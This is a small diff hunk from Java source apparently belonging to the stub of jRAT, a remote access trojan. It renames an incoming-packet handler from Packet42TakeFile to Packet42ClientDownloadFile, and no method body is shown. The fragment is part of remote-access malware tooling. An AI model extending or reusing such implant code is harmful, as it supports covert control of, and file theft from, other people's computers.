@@ -7,7 +7,7 @@ import se.jrat.stub.Connection;
 import se.jrat.stub.Main;
 
 
-public class Packet42TakeFile extends AbstractIncomingPacket {
+public class Packet42ClientDownloadFile extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
